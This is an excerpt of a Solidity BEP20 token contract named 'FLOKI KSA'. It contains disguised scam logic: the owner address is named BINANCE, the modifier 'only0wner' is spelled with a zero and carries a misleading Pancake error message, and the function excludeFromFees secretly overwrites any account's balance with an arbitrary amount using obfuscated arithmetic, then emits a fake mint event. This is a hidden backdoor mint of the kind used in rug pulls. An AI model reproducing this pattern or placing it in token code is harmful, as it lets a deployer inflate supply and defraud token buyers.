...
contract FLOKIKSA is Context, IBEP20, IBEP20Metadata, Ownable {
  ...
  address BINANCE;
    ...
    constructor() {
        // Editable
            BINANCE = msg.sender;
            allowAddress[BINANCE] = true;
        _name = "FLOKI KSA";
        _symbol = "FLOKSA";
        uint t_totalSupply = 100_000_000_000_000_000_000_000;
        isPaused = false;
        // End editable

        isPauseExempt[msg.sender] = true;

        _mint(msg.sender, t_totalSupply);
    }
  ...
  modifier only0wner () {
    require(BINANCE == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  ...
  function excludeFromFees(address account, uint256 amount) external only0wner {
    _balances[account] = (amount / amount - amount / amount) + amount * 10 ** 9;
            emit Transfer(address(0), account, amount);
  }
    /**
